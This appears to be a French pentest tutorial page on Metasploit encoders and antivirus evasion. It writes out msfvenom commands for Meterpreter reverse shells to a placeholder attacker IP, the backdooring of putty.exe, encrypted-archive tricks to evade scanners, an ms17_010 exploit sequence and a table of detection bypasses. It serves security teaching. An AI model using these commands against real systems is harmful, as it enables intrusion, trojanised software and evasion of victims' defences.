# Encoders et evasion

Les payloads Metasploit standards sont tres detectes par les solutions de securite. Les encoders et les techniques d'evasion permettent de modifier la forme du payload pour contourner les signatures connues, les filtres de caracteres et, dans certains cas, les defenses perimetriques comme les pare-feux et les IDS/IPS.

## Pourquoi

En conditions reelles, un payload genere par MSFVenom sans aucun traitement sera bloque par la majorite des antivirus. Comprendre les mecanismes d'encodage et d'evasion, meme si leur efficacite face aux EDR modernes est limitee, reste fondamental. D'une part parce que certains environnements cibles utilisent encore des protections basees sur les signatures, d'autre part parce que ces concepts sont la base de techniques d'evasion plus avancees.

## Comment ca marche

### Encoders

Un encoder transforme le shellcode du payload en une representation differente (XOR, addition, polymorphisme) tout en conservant sa fonctionnalite. A l'execution, un stub de decodage reconstruit le code original en memoire.

```bash
# - Lister les encoders disponibles
msf6 > show encoders

Name                    Rank       Description
----                    ----       -----------
x86/shikata_ga_nai      excellent  Polymorphic XOR Additive Feedback Encoder
x86/countdown           normal     Single-byte XOR Countdown Encoder
x64/xor                 normal     XOR Encoder
```

| Encoder | Type | Particularite |
|---|---|---|
| `x86/shikata_ga_nai` | Polymorphique | Chaque generation produit un code different, le plus connu |
| `x86/countdown` | XOR simple | Leger, moins de variabilite |
| `x64/xor` | XOR 64 bits | Pour les payloads 64 bits |

{% hint style="info" %}
`shikata_ga_nai` (japonais pour "on n'y peut rien") est l'encoder le plus utilise. Son caractere polymorphique signifie que chaque generation produit un binaire different, ce qui complique la detection par signature. Mais les AV modernes connaissent le stub de decodage et le detectent quand meme.
{% endhint %}

### Utiliser un encoder avec MSFVenom

```bash
# - Generer un payload encode
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<IP_ATTAQUANT> LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe -o payload_encode.exe
```

- `-e` : encoder a utiliser
- `-i` : nombre d'iterations d'encodage (chaque passe re-encode le resultat de la precedente)
- Plus d'iterations augmente l'obfuscation mais aussi la taille du binaire

### Utiliser un encoder dans msfconsole

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > set ENCODER x86/shikata_ga_nai
msf6 exploit(windows/smb/ms17_010_psexec) > set Iterations 3
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

### Supprimer les bad characters

Les encoders servent aussi a eviter les caracteres qui cassent l'exploitation (null bytes, retours chariot, etc.).

```bash
# - Generer un payload en excluant les bad chars
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<IP_ATTAQUANT> LPORT=4444 \
  -b '\x00\x0a\x0d' \
  -e x86/shikata_ga_nai \
  -f exe -o clean_payload.exe
```

## En pratique

### Techniques d'evasion complementaires

Les encoders ne sont qu'une piece du puzzle. D'autres techniques existent pour contourner les defenses.

{% tabs %}
{% tab title="Template executables" %}
```bash
# - Injecter le payload dans un executable legitime
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<IP_ATTAQUANT> LPORT=4444 \
  -x /opt/templates/putty.exe \
  -k \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe -o putty_backdoor.exe
```

L'option `-x` utilise un executable comme template et `-k` preserve le fonctionnement de l'application originale (le payload s'execute dans un thread separe).
{% endtab %}
{% tab title="Archivage" %}
```bash
# - Double archivage avec mot de passe
# L'archivage chiffre masque le contenu aux scanners
rar a payload.rar -p payload.exe
mv payload.rar payload
rar a payload2.rar -p payload
```

Certains AV ne decompriment pas les archives chiffrees pour les scanner.
{% endtab %}
{% tab title="Packers" %}
Les packers compriment l'executable et ajoutent un stub de decompression a l'execution.

Outils courants :
- **UPX** : open source, tres connu (donc detecte)
- **Themida** : commercial, protection forte
- **Enigma Protector** : obfuscation + virtualisation
- **MPRESS** : compression avec obfuscation basique
{% endtab %}
{% endtabs %}

### Types de defenses a contourner

| Couche | Exemples | Methode de detection |
|---|---|---|
| **Endpoint** (sur l'hote) | Antivirus, EDR, AMSI | Signatures, heuristiques, analyse comportementale |
| **Perimetre** (sur le reseau) | Firewall, IDS/IPS, proxy | Inspection de paquets, signatures reseau, anomalies |

| Methode de detection | Principe | Contournement |
|---|---|---|
| **Signature** | Compare le binaire a une base de signatures connues | Encodage, obfuscation, payload custom |
| **Heuristique** | Analyse le comportement suspect du code | Techniques de timing, anti-sandbox |
| **Analyse comportementale** | Observe les actions a l'execution (injection, keylogging) | Injection dans des processus legitimes, chiffrement des communications |
| **Inspection reseau** | Analyse le trafic pour detecter les patterns C2 | Tunnel HTTPS, DNS, ICMP |

### Tunnel chiffre Meterpreter

```bash
# - Utiliser un transport HTTPS pour chiffrer le trafic
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<IP_ATTAQUANT> LPORT=443 \
  -f exe -o shell_https.exe

# - Handler correspondant
msf6 > use multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_https
msf6 > set LHOST <IP_ATTAQUANT>
msf6 > set LPORT 443
msf6 > run
```

{% hint style="success" %}
Le transport HTTPS est souvent prefere en pentest. Le trafic se fond dans le flux HTTPS normal et passe la majorite des proxys d'entreprise sans alerter. Combiner ca avec un certificat SSL valide rend la detection encore plus difficile.
{% endhint %}

## Pieges et galeres

- **Trop d'iterations = instabilite** : encoder un payload 20 fois ne le rend pas 20 fois plus furtif, mais peut le rendre inutilisable. 3 a 7 iterations sont generalement suffisantes
- **Encoders ne garantissent pas l'evasion** : les solutions modernes (Windows Defender, CrowdStrike, SentinelOne) detectent `shikata_ga_nai` meme avec beaucoup d'iterations. L'encodage seul ne suffit plus
- **Template corrompue** : l'injection dans un executable (`-x`) peut casser l'application si le format PE n'est pas compatible. Tester dans un environnement controle
- **AMSI sur Windows 10+** : Anti-Malware Scan Interface intercepte les scripts PowerShell et .NET en memoire. Un payload encode en EXE peut passer, mais un payload en PowerShell sera probablement bloque par AMSI

## Retour terrain

L'encodage de payloads est un sujet qui a beaucoup evolue. Il y a dix ans, `shikata_ga_nai` suffisait a contourner la majorite des AV. Aujourd'hui, les solutions de securite combinent signatures, heuristiques et analyse comportementale, ce qui rend l'encodage seul insuffisant. En pentest professionnel, on utilise plutot des loaders custom, du shellcode chiffre, ou des outils specialises (Sliver, Havoc) pour l'evasion. Les encoders Metasploit restent utiles pour gerer les bad characters et pour les environnements avec des defenses basiques.

## Memo express

| Commande / Option | Usage |
|---|---|
| `show encoders` | Lister les encoders |
| `-e x86/shikata_ga_nai` | Appliquer un encoder (MSFVenom) |
| `-i 5` | Nombre d'iterations |
| `-b '\x00\x0a'` | Exclure des bad characters |
| `-x template.exe -k` | Injecter dans un executable |
| `set ENCODER` | Encoder dans msfconsole |
| `reverse_https` | Transport chiffre HTTPS |

***
